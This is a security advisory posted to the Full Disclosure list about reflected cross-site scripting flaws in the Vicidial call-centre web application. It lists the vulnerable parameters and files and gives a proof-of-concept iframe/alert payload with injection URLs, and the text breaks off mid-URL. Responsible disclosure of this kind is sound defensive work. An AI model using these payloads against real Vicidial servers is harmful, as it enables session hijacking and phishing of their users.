---
title: Vicidial v2.14-783a - Multiple XSS Web Vulnerabilities
url: https://seclists.org/fulldisclosure/2022/Oct/15
source: Full Disclosure
date: 2022-10-22
fetch_date: 2025-10-03T20:39:50.770520
---

# Vicidial v2.14-783a - Multiple XSS Web Vulnerabilities

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](14)
[By Date](date.html#15)
[![Next](/images/right-icon-16x16.png)](16)

[![Previous](/images/left-icon-16x16.png)](14)
[By Thread](index.html#15)
[![Next](/images/right-icon-16x16.png)](16)

![](/shared/images/nst-icons.svg#search)

# Vicidial v2.14-783a - Multiple XSS Web Vulnerabilities

---

*From*: "info () vulnerability-lab com" <info () vulnerability-lab com>
*Date*: Mon, 17 Oct 2022 09:53:56 +0200

---

```
Document Title:
===============
Vicidial v2.14-783a - Multiple XSS Web Vulnerabilities

References (Source):
====================
https://www.vulnerability-lab.com/get_content.php?id=2311

Release Date:
=============
2022-10-11

Vulnerability Laboratory ID (VL-ID):
====================================
2311

Common Vulnerability Scoring System:
====================================
5.2

Vulnerability Class:
====================
Cross Site Scripting - Non Persistent

Current Estimated Price:
========================
500€ - 1.000€

Product & Service Introduction:
===============================
VICIDIAL is a software suite that is designed to interact with the Asterisk Open-Source PBX Phone system to act
as a complete inbound/outbound contact center suite with inbound email support as well. The agent interface is an
interactive set of web pages that work through a web browser to give real-time information and functionality with
nothing more than an internet browser on the client computer. The management interface is also web-based and
offers the ability to view many real-time and summary reports as well as many detailed campaign and agent options
and settings. VICIDIAL can function as an ACD for inbound calls or for Closer calls coming from VICIDIAL outbound
fronters and even allows for remote agents logging in from remote locations as well as remote agents that may only
have a phone. There are currently over 24,000 installations of VICIDIAL in production in over 100 countries around
the world, several with over 300 agent seats and many with multiple locations.

(Copy of the Homepage:https://www.vicidial.org/vicidial.php  )
(Download:https://www.vicidial.org/vicidial.php  )

Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered multiple client-site cross site scripting vulnerabilities in
the VICIDIAL v2.14-783a web-application.

Affected Product(s):
====================
Vicidial Group
Product: Vicidial v2.14-783a - (Web-Application)

Vulnerability Disclosure Timeline:
==================================
2022-01-15: Researcher Notification & Coordination (Security Researcher)
2022-01-16: Vendor Notification (Security Department)
2022-**-**: Vendor Response/Feedback (Security Department)
2022-**-**: Vendor Fix/Patch (Service Developer Team)
2022-**-**: Security Acknowledgements (Security Department)
2022-10-11: Public Disclosure (Vulnerability Laboratory)

Discovery Status:
=================
Published

Exploitation Technique:
=======================
Remote

Severity Level:
===============
Medium

Authentication Type:
====================
Pre Auth (No Privileges or Session)

User Interaction:
=================
Low User Interaction

Disclosure Type:
================
Responsible Disclosure

Technical Details & Description:
================================
Multiple non-persistent cross site scripting web vulnerabilities has been discovered in the official VICIDIAL
v2.14-783a web-application.
The vulnerability allows remote attackers to inject malicious script code in post method requests to compromise user
session data
or to manipulate application contents for clients.

The vulnerabilities are located in the `end_date`, `query_date`, `shift`, `type`, `use_lists`,  `search_archived_data`,
`start_hour`, `end_hour`,
`stage`, `agent`, `user`, `db` parameters of the vulnerable `AST_IVRstats.php`, `AST_LISTS_pass_report.php`,
`AST_user_group_hourly_detail.php`,
`AST_agent_time_sheet.php`, `AST_agent_days_detail.php`, `user_status.php`, `admin_lists_custom.php` and `admin.php`
files. Remote attackers
are able to create special crafted malicious links to execute client-side script code from the application context. The
request method to inject
is GET and the attack vector is non-persistent. The identified web vulnerabilities are classic cross site scripting
issues.

Successful exploitation of the vulnerability results in session hijacking, non-persistent phishing attacks,
non-persistent external redirects to
malicious source and non-persistent manipulation of affected application modules.

Request Method(s):
[+] GET

Vulnerable File(s):
[+] AST_IVRstats.php
[+] AST_LISTS_pass_report.php
[+] AST_user_group_hourly_detail.php
[+] AST_agent_time_sheet.php
[+] AST_agent_days_detail.php
[+] user_status.php
[+] admin_lists_custom.php
[+] admin.php

Vulnerable Parameter(s):
[+] end_date
[+] query_date
[+] shift
[+] type
[+] use_lists
[+] search_archived_data
[+] start_hour
[+] end_hour
[+] stage
[+] agent
[+] user
[+] db

Affected Module(s):
[+] Backend Administration Web UI (Agents, Managers & Admins)

Proof of Concept (PoC):
=======================
The client-side post inject web vulnerability can be exploited by remote attackers without account and with low or
medium user interaction.
For security demonstration or to reproduce the cross site web vulnerability follow the provided information and steps
below to continue.

Vulnerable Source: (PoC - IVR Report)
</td><td rowspan="2" valign="TOP">
<font size="2" face="ARIAL,HELVETICA" color="BLACK"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a
href="/vicidial_demo/AST_IVRstats.php?DB=&amp;
type=inbound&amp;query_date=2022-01-16&amp;end_date=2022-01-16&amp;query_date_D=2022-01-16&amp;query_date_T=
&amp;end_date_D=2022-01-16&amp;end_date_T=&amp;shift=[MALICIOUS SCRIPT CODE EXECUTION POINT!]"><iframe src="evil.source"
onload="alert(document.domain)"></iframe>
&amp;file_download=1&amp;search_archived_data="&gt;DOWNLOAD</a> | <a
href="./admin.php?ADD=3111&amp;group_id=">MODIFY</a> |
<a href="./admin.php?ADD=999999">REPORTS</a> | <a href="./AST_CLOSERstats.php?query_date=2022-01-16&amp;
end_date=2022-01-16&amp;shift=">[MALICIOUS SCRIPT CODE EXECUTION POINT!]<iframe src="evil.source"
onload="alert(document.domain)"></iframe>"&gt;CLOSER REPORT</a>
</font>
</td></tr>

PoC: Payload
<iframe src=evil.source onload=alert(document.domain)></iframe>

PoC: Vulnerable Parameters
https://vicidial.localhost:8080/vicidial/AST_IVRstats.php?DB=&type=inbound&query_date=+00%3A00%3A00&end_date[XSS]+23%3A59%3A59&query_date_D=
&query_date_T=00%3A00%3A00&end_date_D=&end_date_T=23%3A59%3A59&shift=ALL&report_display_type=HTML

https://vicidial.localhost:8080/vicidial/AST_IVRstats.php?DB=&type=inbound&query_date=[XSS]+00%3A00%3A00&end_date+23%3A59%3A59&query_date_D=
&query_date_T=00%3A00%3A00&end_date_D=&end_date_T=23%3A59%3A59&shift=ALL&report_display_type=HTML

https://vicidial.localhost:8080/vicidial/AST_IVRstats.php?DB=&type=inbound&query_date=+00%3A00%3A00&end_date=+23%3A59%3A59&query_date_D=
&query_date_T=00%3A00%3A00&end_date_D=&end_date_T=23%3A59%3A59&shift[XSS]&report_display_type=HTML

https://vicidial.localhost:8080/vicidial/AST_IVRstats.php?DB=&type=[XSS]&query_date=+00%3A00%3A00&end_date=+23%3A59%3A59&query_date_D=
&query_date_T=00%3A00%3A00&end_date_D=&end_date_T=23%3A59%3A59&shift=ALL&report_display_type=HTML

https://vicidial.localhost:8080/vicidial/AST_IVRstats.php?DB=[XSS]&type=inbound&query_date=+00%3A00%3A00&end_date+23%3A59%3A59&query_date_D=
&...